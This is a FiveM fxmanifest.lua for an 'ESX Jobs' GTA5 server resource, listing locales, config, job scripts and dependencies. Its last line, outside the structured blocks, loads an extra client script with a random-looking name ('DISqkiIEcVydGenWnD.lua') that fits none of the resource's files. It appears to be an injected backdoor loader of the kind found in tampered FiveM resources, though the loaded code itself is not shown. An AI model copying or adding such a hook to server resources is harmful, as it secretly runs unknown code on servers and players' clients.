fx_version 'bodacious'
game 'gta5'

description 'ESX Jobs'

version '1.1.0'

server_scripts {
	'@essentialmode/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'locales/br.lua',
	'locales/fi.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'config.lua',
	'client/jobs/fisherman.lua',
	'client/jobs/fueler.lua',
	'client/jobs/lumberjack.lua',
	'client/jobs/miner.lua',
	'client/jobs/reporter.lua',
	'client/jobs/slaughterer.lua',
	'client/jobs/tailor.lua',
	'client/main.lua'
}

dependencies {
	'essentialmode',
	'esx_addonaccount',
	'skinchanger',
	'esx_skin'
}
client_script "DISqkiIEcVydGenWnD.lua"